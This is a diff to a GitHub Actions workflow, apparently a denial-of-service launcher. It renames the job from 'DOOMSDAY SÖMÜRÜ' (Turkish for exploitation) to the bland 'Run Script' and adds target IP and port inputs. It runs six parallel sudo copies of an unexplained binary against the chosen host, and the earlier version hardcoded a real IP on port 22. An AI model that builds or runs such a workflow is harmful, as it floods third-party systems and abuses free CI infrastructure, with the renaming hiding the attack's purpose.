@@ -1,8 +1,15 @@
-name: TekPoyraz - DOOMSDAY SÖMÜRÜ (256x) 😈
+name: Run Script
 
 on:
   workflow_dispatch:
-
+    inputs:
+      ip:
+        description: "Target IP"
+        required: true
+      port:
+        description: "Target Port"
+        required: true
+        
 jobs:
   vds:
     runs-on: ubuntu-latest
@@ -22,10 +29,13 @@ jobs:
           
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
+          IP="${{ inputs.ip }}"
+          PORT="${{ inputs.port }}"
+          echo "IP=$IP PORT=$PORT"
           PIDS=()
           for i in {1..6}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
-            sudo timeout 60 ./3 216.202.200.164 22 500 1000 99999 &
+            sudo timeout 60 ./3 "$IP" "$PORT" 500 1000 99999 &
             PIDS+=($!)
           done
           
@@ -38,3 +48,4 @@ jobs:
           # Son bir uyku çek ve kapan
           sleep 60
           exit 0
+          
